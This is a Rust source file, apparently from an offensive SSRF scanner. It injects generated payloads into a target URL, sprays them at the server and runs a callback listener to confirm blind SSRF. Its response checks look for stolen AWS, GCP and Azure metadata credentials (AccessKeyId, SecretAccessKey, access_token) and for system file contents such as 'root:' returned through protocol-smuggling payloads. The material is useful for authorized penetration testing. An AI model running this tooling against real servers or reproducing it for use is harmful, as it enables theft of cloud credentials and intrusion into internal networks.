use colored::Colorize;
use std::time::Duration;
use tokio::time::sleep;

use super::callback::{CallbackServer, print_hits};
use super::payloads::{PayloadCategory, generate_payloads, print_payloads};

pub async fn probe(
    target_template: &str,
    port: u16,
    external_ip: Option<String>,
    cloud: &str,
    smuggle: bool,
    custom: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    // Resolve external IP
    let ext_ip = match external_ip {
        Some(ip) => ip,
        None => detect_external_ip().await?,
    };

    println!("{} External IP: {}", "[*]".cyan().bold(), ext_ip.green());

    // Start callback server
    let server = CallbackServer::start(port).await?;

    // Generate payloads
    let payloads = generate_payloads(&ext_ip, port, cloud, smuggle, custom);
    print_payloads(&payloads);

    if !target_template.contains("{SSRF}") {
        anyhow::bail!(
            "Target URL must contain {{SSRF}} placeholder. Example: http://target.com/fetch?url={{SSRF}}"
        );
    }

    println!("{} Target: {}", "[*]".cyan().bold(), target_template);
    println!(
        "{} Sending {} payloads...",
        "[*]".cyan().bold(),
        payloads.len()
    );
    println!("{}", "─".repeat(60).dimmed());

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()?;

    let mut results = Vec::new();

    for payload in &payloads {
        let url = target_template.replace("{SSRF}", &payload.url);

        let category_str = match payload.category {
            PayloadCategory::Callback => "CALLBACK",
            PayloadCategory::AwsMetadata => "AWS",
            PayloadCategory::GcpMetadata => "GCP",
            PayloadCategory::AzureMetadata => "AZURE",
            PayloadCategory::InternalScan => "INTERNAL",
            PayloadCategory::ProtocolSmuggle => "SMUGGLE",
            PayloadCategory::Custom => "CUSTOM",
        };

        eprint!(
            "{} [{}] {}... ",
            "[>]".cyan(),
            category_str.dimmed(),
            payload.name.white()
        );

        match client.get(&url).send().await {
            Ok(resp) => {
                let status = resp.status();
                let body = resp.text().await.unwrap_or_default();
                let body_preview: String = body.chars().take(200).collect();
                let body_len = body.len();

                let interesting = is_interesting_response(&body, &payload.category);

                if interesting {
                    eprintln!("{} {} ({} bytes)", "FOUND".green().bold(), status, body_len);
                    results.push(ProbeResult {
                        payload: payload.name.clone(),
                        url: url.clone(),
                        status: status.as_u16(),
                        body_len,
                        body_preview,
                        interesting: true,
                        category: payload.category,
                    });
                } else {
                    eprintln!("{} {} ({} bytes)", "ok".dimmed(), status, body_len);
                    results.push(ProbeResult {
                        payload: payload.name.clone(),
                        url: url.clone(),
                        status: status.as_u16(),
                        body_len,
                        body_preview,
                        interesting: false,
                        category: payload.category,
                    });
                }
            }
            Err(e) => {
                eprintln!("{} {}", "ERR".red(), e);
                results.push(ProbeResult {
                    payload: payload.name.clone(),
                    url: url.clone(),
                    status: 0,
                    body_len: 0,
                    body_preview: e.to_string(),
                    interesting: false,
                    category: payload.category,
                });
            }
        }

        // Small delay between requests
        sleep(Duration::from_millis(200)).await;
    }

    // Wait a bit for callbacks to arrive
    println!("\n{} Waiting 3s for callbacks...", "[*]".cyan().bold());
    sleep(Duration::from_secs(3)).await;

    // Print results
    println!("\n{}", "═".repeat(60).cyan());
    println!("{} SSRF Probe Results", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());

    // Check callbacks
    let hits = server.get_hits().await;
    print_hits(&hits);

    // Print interesting results
    let interesting: Vec<&ProbeResult> = results.iter().filter(|r| r.interesting).collect();
    if !interesting.is_empty() {
        println!(
            "{} {} interesting response(s) found:",
            "[+]".green().bold(),
            interesting.len()
        );
        println!("{}", "─".repeat(60).dimmed());

        for r in &interesting {
            println!(
                "  {} {} (HTTP {})",
                "•".green(),
                r.payload.white().bold(),
                r.status
            );
            println!("    {} {}", "URL:".dimmed(), r.url.green());
            println!("    {} {} bytes", "Size:".dimmed(), r.body_len);
            println!("    {} {}", "Preview:".dimmed(), r.body_preview.dimmed());
            println!();
        }
    }

    if hits.is_empty() && interesting.is_empty() {
        println!("{} No SSRF vulnerabilities detected.", "[-]".red().bold());
    } else if !hits.is_empty() {
        println!(
            "{} Blind SSRF confirmed — server made callback to our listener!",
            "[+]".green().bold()
        );
    }

    Ok(())
}

pub async fn listen_only(port: u16) -> anyhow::Result<()> {
    let server = CallbackServer::start(port).await?;

    println!(
        "{} Listening for callbacks on port {}",
        "[*]".cyan().bold(),
        port
    );
    println!("{} Press Ctrl+C to stop", "[*]".cyan().bold());
    println!("{}", "─".repeat(60).dimmed());

    // Keep running until interrupted
    loop {
        sleep(Duration::from_secs(1)).await;
        let hits = server.get_hits().await;
        if !hits.is_empty() {
            print_hits(&hits);
        }
    }
}

pub async fn payloads_only(external_ip: &str, cloud: &str, smuggle: bool) -> anyhow::Result<()> {
    let payloads = generate_payloads(external_ip, 8888, cloud, smuggle, None);
    print_payloads(&payloads);
    Ok(())
}

struct ProbeResult {
    payload: String,
    url: String,
    status: u16,
    body_len: usize,
    body_preview: String,
    interesting: bool,
    category: PayloadCategory,
}

fn is_interesting_response(body: &str, category: &PayloadCategory) -> bool {
    let body_lower = body.to_lowercase();

    match category {
        PayloadCategory::AwsMetadata => {
            body.contains("AccessKeyId")
                || body.contains("SecretAccessKey")
                || body.contains("Token")
                || body.contains("iam")
                || body.contains("instance-id")
                || body.contains("security-credentials")
                || body.contains("ami-id")
        }
        PayloadCategory::GcpMetadata => {
            body.contains("access_token")
                || body.contains("token_type")
                || body.contains("project-id")
                || body.contains("instance/attributes")
                || body.contains("google")
        }
        PayloadCategory::AzureMetadata => {
            body.contains("vmId")
                || body.contains("subscriptionId")
                || body.contains("access_token")
                || body.contains("azure")
                || body.contains("compute")
        }
        PayloadCategory::InternalScan => {
            body_len_check(body)
                && !body_lower.contains("not found")
                && !body_lower.contains("error")
        }
        PayloadCategory::ProtocolSmuggle => {
            body.contains("root:")
                || body.contains("bin/bash")
                || body.contains("daemon:")
                || body.contains("/bin/")
                || body.contains("OK")
                || body.contains("stats")
        }
        PayloadCategory::Callback | PayloadCategory::Custom => false,
    }
}

fn body_len_check(body: &str) -> bool {
    body.len() > 50
}

async fn detect_external_ip() -> anyhow::Result<String> {
    eprintln!("{} Auto-detecting external IP...", "[*]".cyan().bold());
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(5))
        .build()?;
    let ip = client
        .get("https://api.ipify.org")
        .send()
        .await?
        .text()
        .await?;
    Ok(ip.trim().to_string())
}
